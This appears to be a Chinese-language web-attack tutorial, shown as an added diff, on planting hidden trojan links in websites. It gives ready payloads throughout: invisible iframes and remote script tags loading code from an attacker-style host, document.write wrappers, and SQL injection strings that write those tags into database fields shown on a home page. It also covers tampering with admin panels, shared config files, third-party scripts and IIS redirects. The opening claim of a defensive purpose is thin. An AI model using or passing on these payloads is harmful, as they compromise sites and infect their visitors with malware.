@@ -1,0 +1,20 @@
+先说明一点，不是怎么教大家挂马，是让你学会挂马，怎么防守，怎么找马，怎么找关键字，怎么让你学会别人是通过什么方法挂到你的网站上的.. 有利就有弊，随便怎么看吧。
+
+       这里我拿挂首页index.asp来举例子。
+
+   　先说一说，得到webshell的挂马方法
+
+　　一般的挂马的都是用框架，这是最基本的挂马方式，只要不破坏原有的语言逻辑，那就想插入哪里就写哪里了，最基本的语句当然是〈iframe src=http://www.fucksb.net/mm.htm width=0 height=0〉〈/iframe〉，其中http://www.fucksb.net/mm.htm是我们的木马，下面就不一个一个提示了。
+  　上面可能是一般的挂马方式，也是初学者的玩法，好了，再说深一点点的，那就是js文件，好多网站上，你查看源代码都会调用js文件，其中的语句为〈script language=javascript src=./ad/ad.js〉〈/script〉，想到了什么，这里也可以挂马，其中我们可以远程调用自己的js，比如:〈script language=javascript src=http://www.fucksb.net/mm.js〉〈/script〉这个mm.js就可以写木马了，怎么写呢，同样，我们还用最基本的iframe框架，不过在〈script〉〈/script〉之中可识别语言不是html，那怎么办呢，follow me,js文件可以这样写:document.write("〈iframe 〈iframe src=http://www.fucksb.net/mm.htm width=0 height=0〉〈/iframe〉");，这种形势，这时就可以执行此js中的代码了，当然了，说白了，其实全语句就是〈script language=javascript〉document.write("〈iframe 〈iframe src=http://www.fucksb.net/mm.htm width=0 height=0〉〈/iframe〉")〈/script〉呵呵。。
+
+　　聪明的你可能发现了一点，好像不止是js文件哦~，只要在〈script〉〈/script〉之中，无论什么后缀的文件，只要里面写的语句可以被javascript识别就会执行，对的，比如〈script src=http://www.fucksb.net/mm.test〉〈/script〉，又如〈script src=http://www.fucksb.net/mm.lala〉〈/script〉管他的后缀是什么，只要里面写的语句正确就会被执行了。 同样，如果首页调用其它网站，或者次级目录中的htm,asp等如:〈iframe src=./ad/news.htm width=300 height=200〉〈/iframe〉 也可以在news.htm文件里挂马，可以是htm和js，随便哪种，这是比较隐蔽的玩法，这些适用于主页没有写权限的方法。
+
+　 〈script〉同〈iframe〉2个相比较，好处是script整体挂马的代码长度比iframe小得多，很实用。
+
+        说实用是在数据库方面，下面介绍。 数据库挂马，这里我们拿mssql数据库为例子。这里说的是首页调用到的数据库，比如新闻，论坛，公告，等等，一般是标题。这些需要经验去检测，举个例子，比如首页有一条新闻为：“明日开业”，那么鼠标点此新闻，地址栏打开的新窗口为news.asp?id=1，这种情况，这时，就可以判断此新闻是从数据库中调用的了，当然了，我们不说access，只说mssql。
+
+　　首页，我们要有这个网站中的一个注入点，比如就点在vote.asp?id=123，同时，至少是Db_owner权限，这时如果要挂马可以不用取到webshell，因为如果我们的目的只在于挂马的话，而且有时，还得检测mssql数据库和web服务器不在同一个机器上，那挂马的方式就是更改数据库内容，这里我说的就是这种，如上面说的，首页显示的一条新闻标题为“明日开业”，如果首页显示的标题是“明日开业〈/a〉〈iframe src=http://www.fucksb.net/mm.htm width=0 height=0〉〈/iframe〉”，那这样的话，首页就会执行这段代码了，像这种情况，找到了注入点，就得找表名，如此新闻的表名为news，字段为title，id,等等，根据猜测,id=1时，暴出的字段title的值就为“明日开业”，那么90%就可以猜到了，首页调用的数据库的字段就为news表中的title，这时在注入点，可以大胆提交vote.asp?id=123;update news set title=’明日开业〈/a〉〈iframe src=http://www.fucksb.net/mm.htm width=0 height=0〉〈/iframe〉’ where id=1;--，这样就可以更改数据库了，前提是最少要少db_owner权限，当然也有时由于代码原因，也可以这样提交:vote.asp?id=123’;update news set title=’明日开业〈/a〉〈ifrmae src=http://www.fucksb.net/mm.htm width=0 height=0〉〈/iframe〉’ where id=1 and ’1’=’1，也可以...
+
+　　这种方法是有问题的，实战中存在不少问题，因为一般的情况下，标题都是通过〈table〉来限制宽度，也就是说如果你的标题的长度超过了指定的长度，那么你的代码只能写一半，这样就不能执行了，所以挂马最好的方法是用〈script〉这种方法来挂马了，如: vote.asp?id=123;update news set title=’明日开业〈/a〉〈script src=http://www.fucksb.net/mm.js〉〈/script〉’ where id=1;--长度有很大的减少，很不错。 后台挂马 通常注入等不到webshell，就只能靠进后台挂马。 这里说的是进入了后台，但不能通过后台得到webshell，这时要仔细关察后台，像比较网站的链接、顶部底部的广告、都可以直接写入你的木马代码，等等，后台是灵活的，具体问题具体分析。不过有一点很重要，是不要打乱前台htm源文件里的代码逻辑，比如应该闭合前面的〈a〉〈img〉"( 等这些符号，应该先闭合掉如〈/a〉〈/img〉")。 其它形式 如一首页调用了〈iframe src=vote.asp?id=1&no=view width=100〉〈/iframe〉此种形势，一样可以在vote.asp中直接写入iframe木马代码，如果调用的是〈script src=vote.asp?id=1&no=view width=100〉〈/script〉在vote.asp写代码时，请用document.write("")这种格式写入，当然，如果被挂文件中还有调用的文件可以继续往深处写，如果你够狠的话，直接写到数据库配置文件中，如conn.asp，这样好多页面可以同时挂上你的一种木马了。 当然这里也有js文件，一样原理。 挂一个网站的马，不一定就得攻入他，有时没有方法的同时，可以考虑跨站。好多站用了别的站的js文件，如:〈script src=http://www.163.com/user.js〉这种情势，这时就可以考虑只拿163.com的权限就行了，只要能修改到user.js文件就可以挂到你要挂的站点了，同理，也有〈iframe src=http://www.163.com/user.htm〉此种情况，一样道理，剑走偏锋，达到目的，无论用什么招数了。
+
+         服务器挂马 这里简单说一个比较狠的吧. 重定向任何调用的htm，js,等文件，只要是执行的如图: 这种方法在计算中用搜索关键词是搜索不到的，反正本地怎么找也找不到。。谁能想到是在iis里设置的呢？而且调用文件那么多，怎么知道是重定向的那个文件呢？反正现在想不到有什么好方法可以解决，如果服务器如上图被挂马了，偶最好的建议是重装IIS..^_^ 
